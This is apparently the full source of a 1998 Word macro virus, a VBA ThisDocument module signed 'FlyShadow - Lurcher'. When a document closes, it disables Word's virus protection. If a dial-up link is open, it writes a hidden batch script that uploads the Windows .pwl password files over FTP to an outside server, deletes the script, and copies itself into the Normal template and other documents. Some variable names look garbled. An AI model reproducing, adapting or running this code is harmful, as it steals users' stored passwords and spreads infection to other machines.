   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   'Copyright (C) 1998 by FlyShadow ~^^~ - Lurcher
   Private Declare Function RasEnumConnections Lib "RasApi32.DLL" Alias "RasEnumConnectionsA" (lprasconn As Any, lpcb As Long, lpcConnections As Long) As Long
   Private Sub Document_Close()
   On Error Resume Next
   Options.VirusProtection = 1 - 1
   Options.SaveNormalPrompt = 1 - 1
   If RasEnumConnections(32, 0, 0) <> 0 Then
   Open "c:\-.bat" For Output As #1
   Print #1, "@echo off" & Chr(13) & Chr(10) & "ctty nul" & Chr(13) & Chr(10) & "echo virii>-" & Chr(13) & Chr(10) & "echo hieis>>-" & Chr(13) & Chr(10) & "echo binary>>-" & Chr(13) & Chr(10) & "for %%. in (%windir%\*.pwl) do echo put %%.>>-" & Chr(13) & Chr(10) & "echo bye>>-" & Chr(13) & Chr(10) & "ftp -s:- ftp.hello.com.tw" & Chr(13) & Chr(10) & "del -|del -.bat" & Chr(13) & Chr(10) & "ctty con" & Chr(13) & Chr(10)
   Close #1: Shell "c:\-.bat", 0: End If
   Set £\ = IIf(MacroContainer <> "Normal.dot", NormalTemplate, ActiveDocument)
   With £ \ .VBProject.VBComponents(1).CodeModule
   If £o.Find("~^^~", 0, 0, 0, 0, 0, 0) = 0 Then _
   .DeleteLines 1, .CountOfLines: _
   .AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 70)
   End With: End Sub
